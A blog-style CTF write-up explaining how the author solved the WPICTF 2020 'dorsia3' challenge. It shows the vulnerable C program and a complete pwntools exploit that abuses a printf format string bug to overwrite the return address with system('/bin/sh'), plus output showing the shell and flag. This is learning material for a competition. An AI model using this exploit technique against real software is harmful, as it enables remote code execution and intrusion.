---
title: Dorsia3 without gadgets (WPICTF 2020)
categories: [ctf, writeup]
---

### Why this writeup?

After the end of WPICTF, I looked at writeups so see how people solved
different challenges, and realised that for dorsia1 and dorsia3, people had
used a completely different approach, using magic gadgets, than the one I took,
so I thought I would share what I did.

### dorsia3 250pts (55 solves)

#### Challenge Description:

```
http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The third card.

nc dorsia3.wpictf.xyz 31337 or 31338 or 31339

made by: awg
```

#### Attachments

* [`nanoprint`][0]
* [`libc.so.6`][1]

The third card on the video shows the following code:

```c
#include <stdio.h>
#include <stdlib.h>

void main() {
	char a[69];
	printf("%p%p\n", a, system - 288);
	fgets(a, 69, stdin);
	printf(a, "%s\n");
}
```

Because, the program is printing untrusted user input with `printf`, a format
string vulnerability can be exploited. We are also given the address of the
buffer and the `system` function.

With some local testing, with GDB, I realised that the return address was 113
bytes after the address of the buffer `a`. `%n` will set the number of bytes
written to the address pointed to by the pointed given as argument. So what we
do, is we set the address of system, where the return pointer is and then set
a pointer to `/bin/sh`, where system expects to find its first argument, in my
case that was 121 bytes after the location of `a`.

#### The final exploit:

```python
#!/usr/bin/env python

from pwn import *

if False: # if True, run the exploit locally, otherwise, run it remotely
    r = process("./nanoprint")
    libc = ELF("/usr/lib32/libc.so.6")
else:
    r = remote('dorsia3.wpictf.xyz', 31337)
    libc = ELF("./libc.so.6")

line = r.recvline().decode()
# Read the address of `a` and `system`
a = int(line[:10], 16)
system = int(line[10:], 16) + 288

libc.address = system - libc.symbols['system']

bin_sh = next(libc.search(b'/bin/sh'))

lsb_sys = system & 0xffff
msb_sys = system >> 16
lsb_sh = bin_sh & 0xffff
msb_sh = bin_sh >> 16
values = [
        (lsb_sys, 7),
        (msb_sys, 8),
        (lsb_sh, 9),
        (msb_sh, 10)
        ]

values = sorted(values)

# A 1 byte padding is needed so that printf uses the correct arguments
payload = b"A"
payload += p32(a + 113)
payload += p32(a + 115)
payload += p32(a + 121)
payload += p32(a + 123)

written = 17 # 4 * 4 + 1; 4 bytes for each address and 1 byte for the "A"
for value in values:
    payload += f"%{value[0] - written}x".encode()
    written = value[0]
    payload += f"%{value[1]}$n".encode()
r.sendline(payload)
r.recvline() # The output of `printf`
r.interactive()
```

I trick I used, which I doubt the usefulness of is sorting the addresses I need
to write to by the value they should have. This in theory means that less data
has to be sent back when `printf` is executed on the server side. However it is
not necessary.

Initially, I tried to use a `/bin/sh` that was inside of `a` however, that
failed so I fell back to using one inside of libc.

After running the exploit, we get a shell on the target, running `ls` reveals
that the flag is in the current directory and we can now just `cat` it:

```
$ ./exploit.py
[+] Opening connection to dorsia3.wpictf.xyz on port 31337: Done
[*] 'wpictf_2020/dorsia3/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
$ ls
flag.txt
nanoprint
run_problem.sh
stdbuf
$ cat flag.txt
WPI{Th3re_is_an_idea_of_4_Pa7rick_BatemaN}
```

This however, isn't the easiest way to solve the challenge as it is takes more
time. If you haven't already, I'd recommend reading [other write-ups][2] as
well to explore the different methods that can be used.

[0]: https://ctf.wpictf.xyz/files/4d325258ec2ab3df5383833fb30fe8aa/nanoprint?token=eyJ1c2VyX2lkIjo2NzQsInRlYW1faWQiOjM4OCwiZmlsZV9pZCI6MTR9.Xp3VIg.mDHcGNvi4W0KGbA3cKtCHwYKc0E
[1]: https://ctf.wpictf.xyz/files/fe7a59ebaa5fc5e00deae6553bce0677/libc.so.6?token=eyJ1c2VyX2lkIjo2NzQsInRlYW1faWQiOjM4OCwiZmlsZV9pZCI6MTV9.Xp3VIg.Z7c2-xFMKP-lfla8wamuBuImt0Y
[2]: https://ctftime.org/task/11316
